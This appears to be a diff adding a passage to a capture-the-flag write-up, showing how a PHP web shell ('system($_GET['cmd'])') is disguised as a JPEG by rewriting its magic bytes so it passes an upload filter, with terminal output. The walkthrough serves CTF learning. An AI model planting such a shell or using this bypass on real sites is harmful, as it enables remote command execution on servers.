@@ -138,6 +138,27 @@ To access the magic bytes of the file, we'll use ```hexeditor```
 
 command:```hexeditor bankai.php```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8a33d3a2-05c8-4b42-8d2f-afc17283ee5c)
+
+We'll be changing that from ```41 41 41 41``` to ```FF D8 FF EE```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/922fd96c-89fc-4e5e-9ce6-6f4f4b22f03d)
+
+To save and exit, hit ```ctrl + x```
+
+```
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
+└─$ cat bankai.php 
+<?php system($_GET[‘cmd’]); ?>
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
+└─$ file bankai.php   
+bankai.php: JPEG image data
+```
+Good, now lets try to upload this
+
+
 
 
 
